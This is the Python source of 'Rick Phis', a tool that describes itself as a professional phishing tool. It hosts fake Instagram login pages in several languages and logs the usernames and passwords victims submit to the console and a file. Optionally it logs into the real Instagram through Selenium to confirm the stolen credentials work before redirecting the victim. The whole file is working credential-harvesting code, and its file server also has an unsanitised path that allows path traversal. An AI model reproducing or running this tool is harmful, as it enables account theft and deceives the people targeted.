from http.server import BaseHTTPRequestHandler, HTTPServer
from colorama import Fore, init
import argparse
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from urllib.parse import unquote
import socket
import time
from datetime import datetime

init()

red_color = Fore.RED
white_color = Fore.WHITE
yellow_color = Fore.YELLOW
green_color = Fore.GREEN

current_datetime = datetime.now()
formatted_date = current_datetime.strftime("%d/%m/%Y %H:%M:%S")

logo = """  _____  _      _      _____  _     _      
 |  __ \\(_)    | |    |  __ \\| |   (_)     
 | |__) |_  ___| | __ | |__) | |__  _ ___  
 |  _  /| |/ __| |/ / |  ___/| '_ \\| / __| 
 | | \\ \\| | (__|   <  | |    | | | | \\__ \\ 
 |_|  \\_\\_|\\___|_|\\_\\ |_|    |_| |_|___/"""

accounts = [
    "[1] Normal",  "[2] Security",
    "[3] Verify",  "[4] CLD Tools"
]

print(f"{red_color}{logo}")
print(Fore.WHITE + "\n                     by https://github.com/Rickidevs\n")

for account in accounts:
    number, description = account.split(']', 1)
    print(f'{red_color}[{white_color}{number[1]}{red_color}] {yellow_color}{description.strip()}')

print(Fore.RESET)

language_mapping = {
    'ar': "htmls\\ar.html",
    'az': "htmls\\az.html",
    'ch': "htmls\\ch.html",
    'en': "htmls\\index.html",
    'fr': "htmls\\fr.html",
    'de': "htmls\\de.html",
    'it': "htmls\\it.html",
    'ko': "htmls\\ko.html",
    'ru': "htmls\\ru.html",
    'es': "htmls\\es.html",
    'tr': "htmls\\tr.html"
}

error_pages = {
    'ar': "errors_htmls\\errorar.html",
    'az': "errors_htmls\\erroraz.html",
    'ch': "errors_htmls\\errorch.html",
    'en': "errors_htmls\\errordef.html",
    'fr': "errors_htmls\\errorfr.html",
    'de': "errors_htmls\\errorde.html",
    'it': "errors_htmls\\errorit.html",
    'ko': "errors_htmls\\errorko.html",
    'ru': "errors_htmls\\errorru.html",
    'es': "errors_htmls\\errores.html",
    'tr': "errors_htmls\\errortr.html"
}

help_menu = f"""{Fore.YELLOW}
Rick Phis - professional phishing tool

Arguments:
  --site  <site_number>     Site number (e.g., 1, 2, 3)
  --lang  <language_code>   Language code (ar,az,ch,en,fr,de,it,ko,ru,es,tr) (default: en)
  --port  <port_number>     Port number (0-65535)
  --output <file_name>      Gets information as output
  --location <url>          Redirect location (default: https://instagram.com)
  --help                    Show this help message and exit
"""

login_check = False

def check_turst(username, password):
    global login_check
    driver = webdriver.Chrome()
    driver.implicitly_wait(0)
    driver.get("https://www.instagram.com/accounts/login/")

    WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.NAME, "username")))
    user_field = driver.find_element(By.NAME, "username")
    pass_field = driver.find_element(By.NAME, "password")

    user_field.send_keys(username)
    pass_field.send_keys(password)

    login_button = driver.find_element(By.CSS_SELECTOR, "button._acan._acap._acas._aj1-._ap30")
    login_button.click()

    time.sleep(2)

    error_message = driver.find_elements(By.XPATH, "//div[@class='_ab2z']")
    if error_message:
        login_check = False
        print(Fore.RED + "Login failed! The username or password is incorrect." + Fore.RESET)
    else:
        print(Fore.GREEN + "Login successful!" + Fore.RESET)
        login_check = True

    driver.quit()

def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('google.com', 80))
        ip_address = s.getsockname()[0]
    except Exception as e:
        print("Failed to obtain IP address:", e)
        ip_address = None
    finally:
        s.close()
    return ip_address

def find_empty_port(start_port=8000, end_port=65535):
    for port in range(start_port, end_port + 1):
        if not is_port_in_use(port):
            return port
    print("No free ports were found in the specified range.")
    return None

def is_port_in_use(port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('localhost', port))
        s.close()
        return False
    except OSError:
        return True

class CustomArgumentParser(argparse.ArgumentParser):
    def error(self, message):
        raise argparse.ArgumentError(None, message)

def main():
    global web_site
    parser = CustomArgumentParser(description="Rick Phis - professional phishing tool", usage=argparse.SUPPRESS, add_help=False)
    parser.add_argument('--site','-s', type=int, required=True, help='Site number (e.g., 1, 2, 3)')
    parser.add_argument('--lang','-l', type=str, default='en', help='Language code (e.g., en, tr, de)')
    parser.add_argument('--port','-p', type=int, default=0, help='Port number (0-65535)')
    parser.add_argument('--output','-o', type=str, help='Gets information as output')
    parser.add_argument('--location', type=str, default='https://instagram.com', help='Redirect location (default: https://instagram.com)')
    parser.add_argument('--check', '-c', action='store_true', help='Perform login check')

    try:
        while True:
            user_input = input(Fore.BLUE + "Phish: " + Fore.RESET).strip().split()
            if 'help' in user_input or '-h' in user_input or '--help' in user_input:
                print(help_menu)
                continue
            try:
                args = parser.parse_args(user_input)
            except argparse.ArgumentError as e:
                print(Fore.RED + "Invalid arguments, please get help with --help/-h command!" + Fore.RESET)
                print(Fore.RESET)
                continue
            except SystemExit:
                print(Fore.RED + "Invalid arguments, please get help with --help/-h command!" + Fore.RESET)
                print(Fore.RESET)
                continue

            if args.port < 0 or args.port > 65535:
                print(Fore.RED + "Port number must be in the range 0-65535!")
                continue

            chosen = args.site
            lang = args.lang
            port = args.port
            output_file = args.output
            redirect_location = args.location
            check_trust = args.check

            web_site = language_mapping.get(lang.lower())
            if not web_site:
                print(Fore.RED + "Invalid language code!")
                continue

            if chosen == 1:
                start_server(web_site, port, output_file, redirect_location,check_trust)
            else:
                print(f"Site {chosen} is under development. Coming soon!")

    except KeyboardInterrupt:
        print(Fore.YELLOW, "\nRick Phis was stopped (ctrl+c)", Fore.RESET)


def start_server(web_site, port, output_file, redirect_location, check_trust):
    class MyHTTPRequestHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            file_path = self.path.strip('/')
            if file_path == '':
                file_path = web_site
            
            try:
                if file_path.endswith('.css'):
                    with open(file_path, 'rb') as file:
                        content = file.read()
                        self.send_response(200)
                        self.send_header('Content-type', 'text/css')
                        self.end_headers()
                        self.wfile.write(content)
                else:
                    with open(file_path, 'rb') as file:
                        content = file.read()
                        self.send_response(200)
                        self.send_header('Content-type', 'text/html')
                        self.end_headers()
                        self.wfile.write(content)
            except FileNotFoundError:
                self.send_error(404, f'File Not Found: {self.path}')
            except Exception as e:
                self.send_error(500, f'Server Error: {e}')
        
        def do_POST(self):
            global login_check
            error_web = error_pages.get(web_site.split('\\')[-1].split('.')[0], "errors_htmls\\errordef.html")
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length).decode('utf-8')
                post_data = post_data.split('&')
                data_dict = {}
                for item in post_data:
                    key, value = item.split('=')
                    data_dict[key] = value
                
                sel_username = unquote(data_dict.get('username', ''))
                sel_password = unquote(data_dict.get('password', ''))
                
                print(f"{Fore.BLUE}[{formatted_date}] {Fore.RED}Username: {sel_username}")
                print(f"{Fore.BLUE}[{formatted_date}] {Fore.RED}Password: {sel_password}{Fore.RESET}")
                
                log_message = ""
                if output_file:
                    log_message = f"[{formatted_date}] Username: {sel_username}\n" \
                                  f"[{formatted_date}] Password: {sel_password}\n"
                    with open(output_file, 'a') as file:
                        file.write(log_message)
                
                if check_trust:
                    check_turst(sel_username, sel_password)
                
                if login_check or not check_trust:
                    self.send_response(302)
                    self.send_header('Location', redirect_location)
                    self.end_headers()
                elif login_check == False and check_trust:
                    self.send_response(302)
                    self.send_header('Location', f"http://{host}:{c_port}/{error_web}")
                    self.end_headers()
            
            except Exception as e:
                self.send_error(500, f'Failed to process POST request: {e}')


    host = get_ip_address()
    if port:
        if is_port_in_use(port):
            print(Fore.RED, f"The specified port {port} is already in use.")
            return
        c_port = port
    else:
        c_port = find_empty_port()

    if c_port:
        try:
            server = HTTPServer((host, c_port), MyHTTPRequestHandler)
            print(f"{Fore.GREEN}\nServer is started on: http://{host}:{c_port}/\n", Fore.RESET)
            server.serve_forever()
        except Exception as e:
            print(Fore.RED, f"Failed to start server: {e}")
    else:
        print(Fore.RED, "No free port found")

if __name__ == "__main__":
    main()

